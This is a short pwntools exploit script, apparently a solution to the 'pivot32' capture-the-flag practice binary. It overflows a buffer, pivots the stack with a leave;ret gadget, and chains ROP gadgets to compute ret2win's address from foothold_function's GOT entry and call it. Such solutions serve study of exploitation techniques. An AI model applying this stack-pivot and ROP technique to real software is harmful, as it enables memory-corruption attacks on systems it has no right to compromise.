from pwn import *

context.log_level = 'debug'
p = process('./pivot32')
elf = ELF('./pivot32')
lib_elf = ELF('./libpivot32.so')

leave_ret = 0x080486a8
pop_eax = 0x080488c0
pop_ebx = 0x08048571
add_eax_ebx = 0x080488c7
mov_eax_eaxp = 0x080488c4
call_eax = 0x080486a3

func_plt = elf.plt['foothold_function']
func_got = elf.got['foothold_function']
foothold_index = lib_elf.symbols['foothold_function']
ret2win_index = lib_elf.symbols['ret2win']
offset = int(ret2win_index-foothold_index)

p.recvuntil("place to pivot: ")
fake_ebp = int(p.recv(10),16)
payload1 = p32(func_plt)
payload1 += p32(pop_eax)
payload1 += p32(func_got)
payload1 += p32(mov_eax_eaxp)
payload1 += p32(pop_ebx)
payload1 += p32(offset)
payload1 += p32(add_eax_ebx)
payload1 += p32(call_eax)

p.recvuntil('> ')
p.sendline(payload1)

payload2 = 'a'*40
payload2 += p32(fake_ebp-4)
payload2 += p32(leave_ret)
p.recvuntil('> ')
p.sendline(payload2)

p.interactive()

